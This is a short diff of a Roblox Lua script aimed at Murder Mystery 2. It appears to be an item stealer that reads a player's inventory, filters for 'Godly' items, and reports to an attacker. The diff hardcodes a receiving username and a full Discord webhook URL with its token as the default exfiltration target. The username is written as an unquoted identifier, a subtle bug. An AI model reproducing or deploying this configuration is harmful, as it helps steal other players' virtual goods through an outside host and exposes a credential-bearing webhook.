@@ -8,11 +8,11 @@ local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {JAMAL_THESCRIPTGUY}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 
 if next(users) == nil or #users == 0 or webhook == "" then plr:Kick("Set username and webhook first") return end
 if game.PlaceId ~= 142823291 then plr:Kick("Join MM2 only") return end
